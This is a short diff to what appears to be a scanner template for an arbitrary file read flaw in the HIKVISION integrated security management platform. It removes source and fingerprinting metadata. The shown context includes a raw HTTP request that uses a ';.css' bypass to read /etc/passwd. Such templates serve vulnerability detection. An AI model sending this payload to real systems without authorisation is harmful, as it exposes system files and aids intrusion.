@@ -3,12 +3,8 @@ info:
   name: HIKVISION 综合安防管理平台 files 任意文件读取
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/anpluucef2fgr4vv'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: anpluucef2fgr4vv
-    fofa: app="HIKVISION-综合安防管理平台"
 http:
 - raw:
   - 'GET /lm/api/files;.css?link=/etc/passwd HTTP/1.1
